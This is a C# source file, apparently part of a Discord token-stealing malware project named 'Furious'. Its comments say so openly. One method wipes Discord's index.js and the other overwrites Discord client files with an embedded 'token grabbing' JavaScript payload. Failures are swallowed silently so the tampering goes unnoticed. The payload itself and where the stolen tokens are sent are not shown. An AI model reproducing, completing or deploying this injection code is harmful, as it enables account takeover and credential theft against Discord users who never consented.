using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;

namespace Furious
{
	internal class FileManagement
	{
		///Clears the targeted file of its contents.
		internal static async Task CleanFile(string path)
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(path))
				{
					await streamWriter.WriteAsync(string.Empty);
				}
			}
			catch
			{
				Debug.WriteLine("An error occured clearing index.js.");
			}
		}

		///Writes the token grabbing JavaScript code into available Discord directories.
		internal static async Task WriteDiscord(string path, string javascriptPath)
		{
			if (File.Exists(path))
			{
				try
				{
					string value = string.Empty;
					using (StreamReader reader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(javascriptPath)))
					{
						value = await reader.ReadToEndAsync();
					}
					using (StreamWriter writer = new StreamWriter(path))
					{
						await writer.WriteAsync(value);
					}
				}
				catch
                		{
					Debug.WriteLine("Error writing to " + path);
                		}
			}
		}
	}
}
